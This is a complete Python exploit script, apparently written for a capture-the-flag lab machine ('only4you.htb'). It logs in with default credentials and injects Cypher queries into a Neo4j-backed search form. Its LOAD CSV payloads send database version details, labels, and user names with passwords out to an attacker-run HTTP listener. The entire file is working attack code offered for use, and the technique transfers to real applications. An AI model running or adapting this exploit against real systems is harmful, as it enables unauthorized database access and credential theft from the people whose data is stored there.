#!/usr/bin/env python3
from requests import Session, exceptions
from argparse import ArgumentParser
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from threading import Thread
from json import dumps

class ReceiverBaseServer(BaseHTTPRequestHandler):

    def log_message(self, *args):
        return

    def do_GET(self):
        self.send_response(404)

        url = urlparse(self.path)
        parameters = parse_qs(url.query)
        for key in parameters:
            message = f"{key}: {parameters[key][0]}"
            if message in self.server.receivedMessages:
                return

            print(message)
            self.server.receivedMessages[message] = message


class ReceiverServer(HTTPServer):

    def __init__(self, lhost: str, lport: int, loggedInSession: Session, targetUrl: str):
        HTTPServer.__init__(self, (lhost, lport), ReceiverBaseServer)
        self.session = loggedInSession
        self.url = targetUrl
        self.serverThread = None
        self.receivedMessages = {}

    def injectCypher(self, cypher: str):
        vulnerableUrl = f"{self.url}/search"
        payload = f"' OR 1=1 WITH 0 as _l00 {cypher} as output RETURN 1//"

        body = {"search": payload}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        self.session.post(vulnerableUrl, headers=headers, data=body, timeout=1)

    def start(self):
        self.serverThread = Thread(target=self.serve_forever, daemon=True)
        self.serverThread.start()

    def stop(self):
        self.shutdown()
        self.serverThread.join()

def getArguments():
    parser = ArgumentParser(description="Exploit for Cypher Injection in only4you.htb")
    parser.add_argument("-u", "--url", required=True, help="URL to target website (e.g: http://mysite)")
    parser.add_argument("-l", "--lhost", required=True, help="Listening host")
    parser.add_argument("-p", "--port", required=False, type=int, default=4444, help=f"Listening port (Default: 4444)")
    return parser.parse_args()

def formatUrl(url: str):
    if not url.startswith("http"):
        url = f"http://{url}"
    if url.endswith('/'):
        url = url[:-1]
    return url

def getLoggedInSession(url: str) -> Session:
    session = Session()
    authUrl = f"{url}/login"
    
    loginData = {"username": "admin", "password": "admin"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        session.post(authUrl, headers=headers, data=loginData, timeout=5)
        return session
    except exceptions.ReadTimeout:
        print("Log-in timed out")
    except exceptions.ConnectionError:
        print("Can't connect for login")
    exit(1)

def getDataExtractingCyphers() -> list:
    return [
            "CALL dbms.components() YIELD edition, versions UNWIND versions as version LOAD CSV FROM {} + 'version=' + version + '&edition=' + edition",
            "CALL db.labels() YIELD label LOAD CSV FROM {} + 'label=' + label",
            "MATCH(usr:user) WITH COLLECT(usr) AS usrs LOAD CSV FROM {} + usrs[0].username + '=' + usrs[0].password",
            "MATCH(usr:user) WITH COLLECT(usr) AS usrs LOAD CSV FROM {} + usrs[1].username + '=' + usrs[1].password"
            ]

def main():
    args = getArguments()
    url = formatUrl(args.url)
    session = getLoggedInSession(url)

    receiver = ReceiverServer(args.lhost, args.port, session, url)
    receiver.start()

    receiverUrl = f"'http://{args.lhost}:{args.port}/?'"
    cyphers = getDataExtractingCyphers()
    for cypher in cyphers:
        formattedCypher = cypher.format(receiverUrl)
        receiver.injectCypher(formattedCypher)
    
    receiver.stop()
    print("\nQuitting..")

if __name__ == "__main__":
    main()
